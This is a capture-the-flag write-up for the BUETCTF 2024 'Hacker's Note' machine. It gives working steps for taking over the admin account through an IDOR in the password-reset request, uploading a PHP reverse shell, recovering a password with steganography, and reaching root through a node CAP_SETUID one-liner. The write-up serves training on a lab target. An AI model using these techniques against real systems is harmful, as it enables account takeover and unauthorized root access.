# Hacker's Note - BUETCTF24 writeup by ic3b3rg
This was one of the featured boot2root problem in BUETCTF 2024. I hope you find this writeup useful.
## Nmap scan
Nothing of interest here. You will just see an open port 80 and 22.

## Directory enumeration with Gobuster
```
gobuster dir -u "http://$ip/" -w /usr/share/wordlists/dirb/common.txt
```
It reveals three interesting directories ```/api```, ```/config``` and ```/upload```. All these Addresses have directory listings. This can be vulnerable in the long run.
## Flag 1 - Gaining Admin Access on the website
### Credential Leak
In "Contact-Us" page we will find the email of the admin.
```admin@hackersnote.com```
We can also confirm it when creating a account with this email, we get a reponse saying that an account with this email had been created.
### Password Reset misconfiguration
Let's create an account with any credentials. Log into the account and go to "Profile Settings" and try to reset our password. 
Enter the fields and tap the button "Reset Password" and intercept the request with burpSuite.
The request looks something like this.
```
POST /api/change_pass.php HTTP/1.1
<-- Not so intersting data -->
-----------------------------190845207831495830682477583225
Content-Disposition: form-data; name="userId"

1055     <--vulnerable
-----------------------------190845207831495830682477583225
Content-Disposition: form-data; name="newPassword"

test1
-----------------------------190845207831495830682477583225
Content-Disposition: form-data; name="confirmPassword"

test1
-----------------------------190845207831495830682477583225--

```
We can change the UserId from 1055 to 1001 and it will change the admin's password.

Lets log into admin's account and go to the admin panel. There will be our first flag.

## Flag 2 - Gaining Access to the System with Dev's Account
### Insufficient Sanitization of Uploaded Files
We can add a book and upload a php reverse shell. Save the book and access it on uploads.

The URL should be - 
```http://$ip/upload/<--php revshell filename-->```

Before that you should set up a listener with the correct port configured on the php revshell.

We should have a shell now.
Make sure to get a stable shell using 
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
### Obtaining Password via Stegnography
Lets go to ```/home/or3k1/``` and run ```ls -lah```
We see the folder called ```.S3cr3t```.
We have the ```user.txt``` but can't open it. This suggests we have to gain access to or3k1 user.

```/home/or3k1/images/Password.jpg``` seems interesting.
But we can't see the image directly.
For this, use 
```
xxd -p Password.jpg
```
and on cyberchef, use ```From Hex``` and then the ```Render Image``` filter.
It is a QR Code which has the following data.
```
Encryption: WPA
Network Name: Or3k1's_H4ck_Z0n3
Password: MySw33tDr34mC0m3sT0n1gh7
Hide Password: false
```
Note that this is not the original password of the user 'or3k1'.
But if you run ```steghide extract -sf Password.jpg``` and use it as the passphrase, it will give the following error,
```
steghide: could not open the file "my_pass.txt".
``` 
Because we dont have write permissions on this directory.
So we can copy it to ```/tmp``` and then do the same thing.
The file contains the password for or3k1.
Then, ```su or3k1``` and the user flag is in ```/home/or3k1/.S3cr3t/user.txt```
## Flag 3 - Escalating Privilege
### Abusing ```CAP_SETUID``` binaries
  
We can run [linpeas.sh](https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh) to see that this vulnerability exists.

According to [gtfobins](https://gtfobins.github.io/gtfobins/node/),
We can run this command to get a root shell.
```
node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```
The flag is in ```/root/root.txt```

## Flag 4 - Bonus Flag
Lets see what sockets are available on the machine by using, ```ss -tulpn```
```
Netid State   Recv-Q  Send-Q          Local Address:Port     Peer Address:Port                                                                                  
udp   UNCONN  0       0               127.0.0.53%lo:53            0.0.0.0:*      users:(("systemd-resolve",pid=669,fd=12))                                      
udp   UNCONN  0       0           10.10.153.37%eth0:68            0.0.0.0:*      users:(("systemd-network",pid=652,fd=15))                                      
tcp   LISTEN  0       80                  127.0.0.1:3306          0.0.0.0:*      users:(("mysqld",pid=862,fd=31))                                               
tcp   LISTEN  0       128             127.0.0.53%lo:53            0.0.0.0:*      users:(("systemd-resolve",pid=669,fd=13))                                      
tcp   LISTEN  0       128                   0.0.0.0:22            0.0.0.0:*      users:(("sshd",pid=823,fd=3))                                                  
tcp   LISTEN  0       128                         *:80                  *:*      users:(("apache2",pid=1034,fd=4),("apache2",pid=948,fd=4),("apache2",pid=947,fd=4),("apache2",pid=943,fd=4),("apache2",pid=902,fd=4),("apache2",pid=885,fd=4),("apache2",pid=884,fd=4),("apache2",pid=883,fd=4),("apache2",pid=880,fd=4),("apache2",pid=879,fd=4),("apache2",pid=865,fd=4))
tcp   LISTEN  0       128                      [::]:22               [::]:*      users:(("sshd",pid=823,fd=4))
```
```mysql``` service is running on port 3306, which is interesting.
Lets run ```mysql```. Then run following commands to get the flag.
```
show database;
use hackersnote;
show tables;
select * from Secret;
```
And then we will get the flag.